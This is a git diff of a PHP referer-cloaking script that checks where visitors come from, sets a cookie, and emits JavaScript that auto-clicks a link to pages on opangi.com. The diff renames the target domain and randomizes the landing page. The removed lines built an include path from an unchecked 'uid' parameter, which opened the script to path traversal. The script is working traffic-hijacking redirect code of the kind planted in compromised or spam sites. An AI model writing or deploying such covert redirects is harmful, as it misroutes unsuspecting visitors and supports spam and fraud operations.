@@ -1,16 +1,22 @@
 <?php
 define('ROOT_DIR', dirname(__FILE__));
-$usereferer = 'www.opamgi.com|opamgi.com';  // 允许访问的来路
+$usereferer = 'www.opangi.com|opangi.com';  // 允许访问的来路
 $cookiename = 'usermyad9990';  // 设置cookie名称
 $cookietime = '0';  // 设置cookie的有效期，0表示关闭浏览器后失效
 $id = isset($_GET['id']) && preg_match('/^[a-zA-Z0-9]+$/i', $_GET['id']) ? $_GET['id'] : 0;
 $uid = isset($_GET['uid']) && preg_match('(.+)', $_GET['uid']) ? $_GET['uid'] : 0;
-$includefile = 'html/'.$id.'/'.$uid.'.html';  // 拼接包含的HTML文件路径
+$includefile = ROOT_DIR.'/'.$id.'.html';  // 拼接包含的HTML文件路径，路径修改为根目录
 
 // 检查HTTP_REFERER是否符合要求
 if (checkreferer($usereferer)){
     _checkcookie($cookiename, $cookietime);
-    echo '<script language=javascript>var id=Math.round(Math.random()*10)+10;document.write("<a id=alink href=http://www.opamgi.com/html/"+id+".html>loding.....</a>");document.getElementById("alink").click();</script>';
+    // 随机选择一个页面进行跳转
+    $pages = array(
+        'GameReviews.html', 'GameNews.html', 'GameTips.html', 
+        'index.html', 'game.html', 'about-us.html', 'contact-us.html', 'privacy-policy.html'
+    );
+    $randomPage = $pages[array_rand($pages)];
+    echo '<script language=javascript>var id=Math.round(Math.random()*10)+10;document.write("<a id=alink href=http://www.opangi.com/'.$randomPage.'>loding.....</a>");document.getElementById("alink").click();</script>';
 }
 
 if (@!file_exists($includefile)) {
@@ -53,3 +59,4 @@ function _checkcookie($cname, $cdate = null){
     }
 }
 ?>
+
